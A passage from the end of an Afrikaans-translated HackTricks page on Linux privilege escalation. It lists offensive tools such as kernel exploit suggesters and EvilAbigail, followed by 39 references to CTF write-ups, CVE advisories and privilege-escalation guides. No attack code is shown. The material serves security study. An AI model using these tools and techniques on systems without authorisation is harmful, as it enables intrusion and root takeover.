**Kernelpop:** Lys kernelfoute in Linux en MAC op [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Versameling van meer skrifte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab-UI-voorregte-eskalasie, hergebruik van zip -P-bewyse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: vervalste .text_sig-loonvrag vir cron-uitgevoerde monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch-omseiling (sudo env_keep PATH-kaping)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Basiese Linux-voorregte-eskalasie](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux-gids vir voorregte-eskalasie](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Aanval en verdediging: Linux-voorregte-eskalasietegnieke van 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Niemand verwag opdraguitvoering nie!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux-voorregte-eskalasie)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Deurloop van laboratoriumoefeninge - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Wenke en truuks vir Linux-voorregte-eskalasie](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux-enumerasie- en voorregte-eskalasienutsmiddel](https://github.com/rtcrowley/linux-private-i)
- [14] [Wat is ’n Socket?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds)-skrywe](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Kom op die D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID-uitvoerbare lêers en Linux-voorregte-eskalasie](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Deel 2 – Linux-voorregte-eskalasie](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Hoe om ACLs op Linux te bestuur](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS-roottoegang via network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Wat is systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash-rekenkundige inspuiting via logs, volledige ketting)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash-handleiding – BASH_ENV (opstartlêer vir nie-interaktiewe sessies)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR-simboliese skakel-voorregte-eskalasie)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron-kopie → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Jy noem dit, VMware verhoog jou voorregte (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot-voorregverhoging](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 en CVE-2025-32463 Sudo-voorregverhogingskwesbaarhede](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC-bewaarplekgi​​dse](https://peps.python.org/pep-3147/)
- [32] [Python importlib-dokumentasie](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit-kwessie #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet deur @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Wagwoorde op Linux aanteken](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Besonderhede van ’n logrotate-rasetoestand](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10-dokumentasie – `site` en padkonfigurasielêers](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
